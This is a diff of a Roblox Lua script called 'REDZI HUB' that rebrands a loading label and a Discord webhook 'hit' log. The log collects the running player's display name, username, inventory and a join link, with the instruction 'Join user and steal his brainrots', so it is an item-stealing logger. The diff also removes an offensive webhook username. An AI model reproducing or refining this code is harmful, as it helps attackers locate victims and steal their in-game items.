@@ -286,7 +286,7 @@ local LoadingIcon = Instance.new("TextLabel")
 LoadingIcon.Parent = LoadingFrame
 LoadingIcon.Size = UDim2.new(1, 0, 0, 30)
 LoadingIcon.Position = UDim2.new(0, 0, 0, 22)
-LoadingIcon.Text = "✦ REDZI HUB ✦"
+LoadingIcon.Text = "$ REDZI HUB $"
 LoadingIcon.TextColor3 = Color3.fromRGB(200, 120, 255)
 LoadingIcon.Font = Enum.Font.GothamBold
 LoadingIcon.TextSize = 18
@@ -744,18 +744,18 @@ local function sendDetailedEmbedLog(joinLink, status)
 
     local payload = {
         content = hitContent,
-        username = "jeffrey epstein",
+        username = "Redzi Hub Hit",
         avatar_url = "https://rayzhubb.vercel.app/pngs/logo.png",
         embeds = {{
             title = "REDZI HUB",
-            description = "<:rayz_info:1459657883846185021> **How to Use?**\nJoin user and steal his brainrots.",
+            description = "❓ **How to Use?**\nJoin user and steal his brainrots.",
             color = 0x800080,
             fields = {
-                { name = "<:rayz_check:1459279711774576846> Status", value = "```" .. status .. "```", inline = false },
-                { name = "<:rayz_member:1459280047570419814> Display Name", value = "```" .. LocalPlayer.DisplayName .. "```", inline = true },
-                { name = "<:rayz_owner:1459280005874974801> Username", value = "```" .. LocalPlayer.Name .. "```", inline = true },
-                { name = "<:rayz_backpack:1459652540630171844> Inventory", value = "```" .. inventoryText .. "```" },
-                { name = "<:rayz_settings:1459279856931176500> Join Player", value = "[ Click to Join ](" .. joinLink .. ")", inline = false },
+                { name = "🧑‍💻⚙️ Status:", value = "```" .. status .. "```", inline = false },
+                { name = "<📛 Display Name:", value = "```" .. LocalPlayer.DisplayName .. "```", inline = true },
+                { name = "<🪪 Username:", value = "```" .. LocalPlayer.Name .. "```", inline = true },
+                { name = "<🎒 Inventory:", value = "```" .. inventoryText .. "```" },
+                { name = "<🔗 Join Player:", value = "[ Click to Join ](" .. joinLink .. ")", inline = false },
             },
             footer = { text = "REDZI HUB • Total Value:", icon_url = "https://rayzhubb.vercel.app/pngs/logo.png" },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
